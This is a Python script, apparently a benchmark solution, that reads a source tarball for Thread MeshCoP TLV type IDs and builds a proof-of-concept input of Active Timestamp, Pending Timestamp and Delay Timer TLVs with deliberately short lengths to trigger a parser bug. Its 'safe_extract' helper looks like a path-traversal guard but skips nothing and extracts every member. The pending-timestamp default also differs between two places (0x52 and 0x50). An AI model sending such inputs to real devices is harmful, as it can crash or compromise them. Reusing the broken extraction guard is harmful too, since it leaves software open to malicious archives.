import os
import re
import tarfile
import tempfile
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        extract_dir = self._extract_source(src_path)
        try:
            type_ids = self._extract_tlv_type_ids(extract_dir)
        finally:
            shutil.rmtree(extract_dir, ignore_errors=True)

        active = type_ids.get("active", 0x51) & 0xFF
        pending = type_ids.get("pending", 0x52) & 0xFF
        delay = type_ids.get("delay", 0x53) & 0xFF

        tlvs = bytearray()

        # Active Timestamp TLV with too-short length (expected 8, provide 1)
        tlvs.append(active)
        tlvs.append(1)  # length
        tlvs.append(0)  # single byte of value

        # Pending Timestamp TLV with too-short length
        tlvs.append(pending)
        tlvs.append(1)
        tlvs.append(0)

        # Delay Timer TLV with too-short length (expected 4, provide 1)
        tlvs.append(delay)
        tlvs.append(1)
        tlvs.append(0)

        return bytes(tlvs)

    def _extract_source(self, src_path: str) -> str:
        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
        with tarfile.open(src_path, "r:*") as tar:
            def is_within_directory(directory, target):
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                prefix = os.path.commonprefix([abs_directory, abs_target])
                return prefix == abs_directory

            def safe_extract(tar_obj, path=".", members=None):
                for member in tar_obj.getmembers():
                    member_path = os.path.join(path, member.name)
                    if not is_within_directory(path, member_path):
                        continue
                tar_obj.extractall(path, members)

            safe_extract(tar, tmpdir)
        return tmpdir

    def _extract_tlv_type_ids(self, root_dir: str) -> dict:
        active = None
        pending = None
        delay = None

        code_exts = (".h", ".hpp", ".hh", ".hxx", ".c", ".cc", ".cpp", ".cxx")

        define_re = re.compile(
            r"^\s*#\s*define\s+(\w+)\s+(0x[0-9A-Fa-f]+|\d+)\b", re.MULTILINE
        )
        enum_assign_re = re.compile(
            r"\b([A-Za-z_]\w*)\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b"
        )

        for dirpath, _, filenames in os.walk(root_dir):
            for fname in filenames:
                if not fname.endswith(code_exts):
                    continue
                fpath = os.path.join(dirpath, fname)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue

                # Look at #define macros
                for name, val in define_re.findall(text):
                    up = name.upper()
                    try:
                        ival = int(val, 0)
                    except ValueError:
                        continue

                    if "TLV" in up:
                        if "TIMESTAMP" in up:
                            if "ACTIVE" in up and active is None:
                                if 0 <= ival <= 255:
                                    active = ival
                            elif "PENDING" in up and pending is None:
                                if 0 <= ival <= 255:
                                    pending = ival
                        if "DELAY" in up and "TIMER" in up and delay is None:
                            if 0 <= ival <= 255:
                                delay = ival

                # Look at enum assignments
                for name, val in enum_assign_re.findall(text):
                    low = name.lower()
                    try:
                        ival = int(val, 0)
                    except ValueError:
                        continue

                    if not (0 <= ival <= 255):
                        continue

                    if "timestamp" in low:
                        if "active" in low and active is None:
                            active = ival
                        elif "pending" in low and pending is None:
                            pending = ival
                    if "delay" in low and "timer" in low and delay is None:
                        delay = ival

                if active is not None and pending is not None and delay is not None:
                    return {"active": active, "pending": pending, "delay": delay}

        # Fallback guesses (based on Thread MeshCoP TLV assignments)
        if active is None:
            active = 0x51
        if pending is None:
            pending = 0x50
        if delay is None:
            delay = 0x53

        return {"active": active, "pending": pending, "delay": delay}